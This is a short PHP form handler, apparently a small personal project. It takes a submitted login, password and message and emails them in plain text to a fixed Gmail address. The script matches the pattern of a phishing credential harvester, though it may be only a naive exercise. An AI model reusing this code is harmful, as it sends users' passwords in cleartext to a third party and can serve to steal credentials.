<?php
if($_SERVER["REQUEST_METHOD"] == "POST"){
    $login = htmlentities($_POST["login"]);
    $password = htmlentities($_POST["password"]);
    $email = htmlentities($_POST["email"]);
    $message = htmlentities($_POST["message"]);
    $toEmail = "fixik2019@gmail.com";
    $subject = "My project message";
    $body =  "Login: " . $login .
        "\r\n Password: " . $password .
        "\r\nMessage: " . $message . "\r\n";

    if(mail($toEmail, $subject, $body)){
        echo "Sending successfully";
    }
    else{
        echo "ERROR: MESSAGE NOT SENT";
    }
}